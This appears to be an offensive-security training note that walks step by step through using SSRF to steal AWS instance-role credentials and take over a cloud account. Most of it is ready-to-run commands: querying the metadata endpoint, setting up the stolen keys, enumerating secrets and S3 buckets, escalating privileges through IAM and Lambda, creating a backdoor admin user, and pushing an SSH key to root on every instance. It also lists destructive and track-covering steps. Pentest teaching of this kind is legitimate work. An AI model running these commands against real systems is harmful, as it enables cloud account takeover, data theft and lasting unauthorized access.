---
tags: [vapt, ssrf, cloud, advanced]
difficulty: advanced
module: "13 - SSRF"
topic: "13.19 SSRF to Cloud Credential Theft → Full Takeover"
---

# 13.19 — SSRF to Cloud Credential Theft

## The Full SSRF → Cloud Takeover Chain

```
COMPLETE ATTACK CHAIN:

1. FIND SSRF VULNERABILITY
   - URL parameter: url=, redirect=, etc.
   - File import, webhook, image fetch, PDF generator

2. REACH METADATA ENDPOINT
   - url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   - Apply bypass techniques if filtered (see notes 14-17)

3. STEAL IAM ROLE CREDENTIALS
   - Response: {"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..."}
   - These are TEMPORARY credentials (expire in ~1-6 hours)
   - Save them immediately!

4. IDENTIFY WHAT THE ROLE CAN DO
   - aws sts get-caller-identity → Who am I?
   - aws iam list-attached-role-policies → What permissions?
   - Enumerate resources

5. ESCALATE PRIVILEGES (if needed)
   - Look for iam:PassRole, iam:CreatePolicyVersion
   - Look for lambda:CreateFunction + iam:PassRole → inject code
   - Look for ec2:RunInstances → launch instance with admin role

6. FULL CLOUD ACCOUNT TAKEOVER
   - Access all S3 buckets
   - Access all databases
   - Access all secrets
   - Create persistence (new admin user)
```

---

## Step-by-Step: AWS Credential Theft

```bash
# STEP 1: GET ROLE NAME:
# SSRF target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: EC2InstanceRole  (or whatever the role is named)

# STEP 2: GET CREDENTIALS:
# SSRF target: http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
# Response:
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4PI...long token...",
  "Expiration": "2024-01-01T06:00:00Z"
}

# STEP 3: SET UP AWS CLI WITH STOLEN CREDS:
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="AQoXnyc4PI..."

# STEP 4: CONFIRM IDENTITY:
aws sts get-caller-identity
# Returns: account, userId, Arn → confirms stolen creds work!
```

---

## Privilege Enumeration

```bash
# ENUMERATE PERMISSIONS WITH STOLEN CREDENTIALS:

# CHECK IAM PERMISSIONS (what can this role do?):
aws iam list-attached-role-policies --role-name EC2InstanceRole
aws iam list-role-policies --role-name EC2InstanceRole
aws iam get-role-policy --role-name EC2InstanceRole --policy-name POLICY_NAME

# ENUMERATE S3:
aws s3 ls                          # list all buckets
aws s3 ls s3://bucket-name/        # list bucket contents
aws s3 cp s3://bucket-name/secrets.txt ./  # download file

# ENUMERATE SECRETS MANAGER:
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
# Often contains: database passwords, API keys, OAuth secrets!

# ENUMERATE SSM PARAMETER STORE:
aws ssm describe-parameters
aws ssm get-parameter --name /prod/db/password --with-decryption

# ENUMERATE EC2:
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-subnets

# ENUMERATE LAMBDA:
aws lambda list-functions
aws lambda get-function --function-name FUNC_NAME  # → download source code!

# ENUMERATE RDS:
aws rds describe-db-instances
# Gets DB endpoints → connect with stolen DB credentials from SSM/Secrets Manager!

# ENUMERATE IAM ITSELF:
aws iam list-users
aws iam list-roles
aws iam get-account-authorization-details  # full IAM dump!
```

---

## Privilege Escalation in AWS

```bash
# IF ROLE HAS iam:CreatePolicyVersion:
# Create new policy version with admin access:
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/EXISTING_POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# IF ROLE HAS iam:PassRole + ec2:RunInstances:
# Launch EC2 with admin role → steal its metadata credentials!
aws ec2 run-instances \
  --image-id ami-XXXXX \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminRole \
  --key-name YOUR_KEY

# IF ROLE HAS lambda:CreateFunction + iam:PassRole:
# Create Lambda function with admin role → invoke to get admin creds!
aws lambda create-function \
  --function-name steal-admin-creds \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# TOOL: Pacu (AWS exploitation framework)
pip3 install pacu
# pacu → set access key, secret, token → enumerate and exploit!
```

---

## Creating Persistence

```bash
# CREATE PERMANENT IAM USER (if iam:CreateUser + iam:CreateAccessKey):
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy \
  --user-name backdoor-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-user
# → Returns permanent access key and secret!
# → Even after EC2 instance is terminated, backdoor persists!

# ADD SSH KEY TO EC2 INSTANCES:
aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text | \
  while read id; do
    aws ssm send-command \
      --instance-ids $id \
      --document-name "AWS-RunShellScript" \
      --parameters 'commands=["echo SSH_PUB_KEY >> /root/.ssh/authorized_keys"]'
  done
```

---

## Quick Impact Summary

```
WHAT YOU CAN DO WITH STOLEN AWS IAM CREDENTIALS:

DATA THEFT:
  ✓ Download all S3 buckets (customer data, backups, PII)
  ✓ Read all database credentials from Secrets Manager
  ✓ Read all SSM parameters (passwords, API keys)
  ✓ Read Lambda environment variables
  ✓ Access all logs (CloudWatch, CloudTrail)

LATERAL MOVEMENT:
  ✓ Connect to RDS databases with stolen credentials
  ✓ Access Elasticsearch on VPC
  ✓ Access Redis/Elasticache clusters
  ✓ Access ECR (container images → source code!)

PERSISTENCE:
  ✓ Create new IAM admin user (permanent)
  ✓ Add SSH keys to all EC2 instances
  ✓ Modify Lambda functions (backdoor code)

DESTRUCTION:
  ✓ Delete S3 buckets
  ✓ Terminate EC2 instances
  ✓ Delete RDS databases
  ✓ Disable CloudTrail (cover tracks)

FINANCIAL:
  ✓ Mine cryptocurrency (GPU instances)
  ✓ Run expensive services
  ✓ Transfer data egress (large bills)
```

---

## Related Notes
- [[09 - SSRF Cloud Metadata]] — metadata endpoints
- [[10 - SSRF AWS IMDSv1 vs IMDSv2]] — IMDSv2 bypass
- [[17 - SSRF WAF Bypass]] — bypass filters to reach metadata
- [[20 - Defense Allowlists IMDSv2]] — how to defend
- [[Module 09 - Cloud Security]] — broader cloud security coverage
